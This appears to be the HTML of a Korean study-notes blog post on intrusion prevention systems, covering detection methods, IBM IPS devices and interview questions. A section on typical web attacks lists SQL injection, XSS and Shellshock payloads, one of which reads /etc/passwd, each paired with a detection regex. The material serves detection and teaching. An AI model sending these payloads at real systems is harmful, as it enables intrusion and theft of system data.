@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html>
+	<head>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <title>
+    IPS(Intrusion Prevention System) - To be Useful to the World
+    
+  </title>
+
+  <meta name="description" content="Signature - SQL Injection 알려진 구문을 탐지">
+
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+  <link rel="stylesheet" href="/assets/vendor/bootstrap/css/bootstrap.min.css">
+
+  <link rel="stylesheet" href="/assets/vendor/fontawesome-free/css/all.min.css">
+
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="http://localhost:4000/2018/07/30/IPS.html">
+  <link rel="alternate" type="application/rss+xml" title="To be Useful to the World" href="/feed.xml">
+
+</head>
+
+	<body>
+		<!-- Navigation -->
+<nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+  <div class="container">
+    <a class="navbar-brand" href="/">Useworld</a>
+    <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+    Menu
+    <i class="fa fa-bars"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarResponsive">
+      <ul class="navbar-nav ml-auto">
+        <li class="nav-item">
+          <a class="nav-link" href="/">Home</a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" href="/about">About</a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" href="/posts">Posts</a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" href="/contact">Contact</a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</nav>
+		<!-- Page Header -->
+
+    <header class="masthead">
+    
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+            <h1>IPS(Intrusion Prevention System)</h1>
+            
+            <span class="meta">Posted by
+              <a href="#">Useworld</a>
+              on July 30, 2018 &middot; <span class="reading-time" title="Estimated read time">
+  
+   2 mins  read </span>
+
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-md-10 mx-auto">
+        <ul>
+  <li>
+    <p>Signature - SQL Injection 알려진 구문을 탐지</p>
+  </li>
+  <li>
+    <p>Threshold - 임계치 설정, DOS 공격 탐지</p>
+  </li>
+  <li>
+    <p>행위기반 - 보편화되진 않지만 쓰이고 있긴 하다.</p>
+
+    <p>​	  	  미래에는 딥러닝, AI 탑재해서 쓸 듯</p>
+  </li>
+  <li>
+    <p>IPS - 탐지된 패킷을 솔루션장비에서 물고있다가 정탐으로 인식되면 버린다.</p>
+
+    <p>​	 패킷에 스트링을 검색하여 탐지</p>
+
+    <p>​	 IDS에 차단하는 기능을 가지고 있는 것</p>
+
+    <p>​	 IPS는 임계치 방식에 특화되어있지 않다.</p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="ibm-ips-장비">IBM IPS 장비</h3>
+
+<p><em>Response Filters</em></p>
+
+<ul>
+  <li>Event 기준</li>
+  <li>src IP, dst IP 설정</li>
+  <li>block, ignore 선택</li>
+</ul>
+
+<p><br /></p>
+
+<p><em>탐지 엔진 순서</em></p>
+
+<ul>
+  <li>Firewall</li>
+  <li>Response Filter</li>
+  <li>User Define Rule
+    <ul>
+      <li>String만 등록(한계가 있음)</li>
+      <li>SNORT 엔진 일부 탑재 OpenSignature(이걸 더 많이 사용함)</li>
+      <li>Tuning Parameter(고급설정)</li>
+    </ul>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<p><em>XGS</em></p>
+
+<ul>
+  <li>IBM 차세대 IPS 장비</li>
+  <li>SNORT 엔진 전체 탑재</li>
+  <li>자체 SSL 인증서 등록(암호화/복호화)</li>
+  <li>각각의 네트워크 구성에 따른 다른 정책 적용</li>
+</ul>
+
+<p><br /></p>
+
+<p><br /></p>
+
+<h2 id="대표적인-웹-공격-구문">대표적인 웹 공격 구문</h2>
+
+<ul>
+  <li>
+    <p>SQL Injection</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' or 1=1--  
+") or ("a"="a  
+and 1=(select @@VERSION) 
+and 1=(IS_SRVROLEMEMBER('sysadmin')) 
+OR 'Simple' BETWEEN 'R' AND 'T' 
+and (substring(db_name(),1,1))='a'
+elect * from (select name_const(version(),1),name_const(version(),1))a
+select * from table where 1=1 and ExtractValue(1,concat(0x01,version()))
+select * from table where 1=1 and UpdateXML(1,concat(0x01,version()),1)
+select * from table where (@:=1)or@ group by concat(@@version,@:=!@)having@||min(0)
+</code></pre></div>    </div>
+
+    <blockquote>
+      <p>Regex : /(\%27)|(')|(--)|(\%23)|(#)/ix</p>
+
+      <p>Link : <a href="https://www.symantec.com/connect/articles/detection-sql-injection-and-cross-site-scripting-attacks">https://www.symantec.com/connect/articles/detection-sql-injection-and-cross-site-scripting-attacks</a></p>
+    </blockquote>
+
+    <p><br /></p>
+  </li>
+  <li>
+    <p>XSS</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;alert("test");&lt;/script&gt; 
+&lt;iframe src=" hxxp://abc.com" width="0" height="0" frameborder="0"&gt;&lt;/iframe&gt;
+&lt;object width=0 height=0 sytle=display:none; type=text/xscriptlet data=mk:@MSITStore:mhtml:c:\abc.mht! hxxp://abc.com/attack_chm::exploit.html&gt;&lt;/object&gt;
+</code></pre></div>    </div>
+
+    <blockquote>
+      <p>Regex : /((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix</p>
+
+      <p>Link : <a href="https://www.symantec.com/connect/articles/detection-sql-injection-and-cross-site-scripting-attacks">https://www.symantec.com/connect/articles/detection-sql-injection-and-cross-site-scripting-attacks</a></p>
+    </blockquote>
+
+    <p><br /></p>
+  </li>
+  <li>
+    <p>Bash ShellShock</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User-Agent : () { :;}; echo bashtest&gt;/tmp/test
+User-Agent : () { :; }; echo $(&lt;/etc/passwd)
+User-Agent : () { :; }; /bin/eject" hxxp://example.com/
+HTTP_USER_AGENT=() { :; }; /bin/eject
+</code></pre></div>    </div>
+
+    <blockquote>
+      <p>Regex : "((?:[^"]|\")*)"</p>
+
+      <p>Link : <a href="https://stackoverflow.com/questions/28115717/regexp-to-parse-apache2-log-handle-shellshock-bash-hack">https://stackoverflow.com/questions/28115717/regexp-to-parse-apache2-log-handle-shellshock-bash-hack</a></p>
+    </blockquote>
+  </li>
+</ul>
+
+<p><br /><br /></p>
+
+<h3 id="배치면접-관제-질문">배치면접 관제 질문</h3>
+
+<blockquote>
+  <p>FW가 뭐에요?</p>
+
+  <p>IDS가 뭐에요?</p>
+
+  <p>IPS가 뭐하는 거에요?</p>
+
+  <p>VPN 써봤어요?</p>
+
+  <p>NAT 설정해봤어요?</p>
+</blockquote>
+
+
+        
+        
+        <hr>
+        <div class="clearfix">
+          
+            <a class="btn btn-primary float-left" href="/2018/07/29/%EC%8A%A4%EB%A7%88%ED%8A%B8%EA%B7%B8%EB%A6%AC%EB%93%9C.html" data-toggle="tooltip" data-placement="top" title="스마트 그리드(Smart Grid)">&larr; Previous<span class="d-none d-md-inline">
+            Post</span></a>
+          
+          
+            <a class="btn btn-primary float-right" href="/2018/07/31/WAF.html" data-toggle="tooltip" data-placement="top" title="WAF(Web Application Firewall)">Next<span class="d-none d-md-inline">
+            Post</span> &rarr;</a>
+          
+        </div>
+        <hr>
+        <div id="disqus_thread"></div>
+        <script>
+        /**
+        *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+        *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+        /*
+        var disqus_config = function () {
+        this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        };
+        */
+        (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = 'https://useworld.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+        })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+      </div>
+    </div>
+  </div>
+		<!-- Footer -->
+
+<hr>
+
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-md-10 mx-auto">
+        <ul class="list-inline text-center">
+          
+          <li class="list-inline-item">
+            <a href="mailto:useworld@naver.com">
+              <span class="fa-stack fa-lg">
+                <i class="fas fa-circle fa-stack-2x"></i>
+                <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+          
+          
+          
+          
+          <li class="list-inline-item">
+            <a href="https://github.com/useworld">
+              <span class="fa-stack fa-lg">
+                <i class="fas fa-circle fa-stack-2x"></i>
+                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+
+          <li class="list-inline-item">
+            <a href="https://open.kakao.com/o/s5bkJP0b">
+              <span class="fa-stack fa-lg">
+                <i class="fas fa-circle fa-stack-2x"></i>
+                <i class="fas fa-comments fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+        </ul>
+        <hr>
+        <p class="copyright text-muted">Copyright &copy; Useworld 2020</p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+		<script src="/assets/vendor/jquery/jquery.min.js"></script>
+<script src="/assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+<script src="/assets/vendor/startbootstrap-clean-blog/js/clean-blog.min.js"></script>
+
+<script src="/assets/scripts.js"></script>
+
+
+
+		<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', '');
+</script>
+
+
+	</body>
+</html>
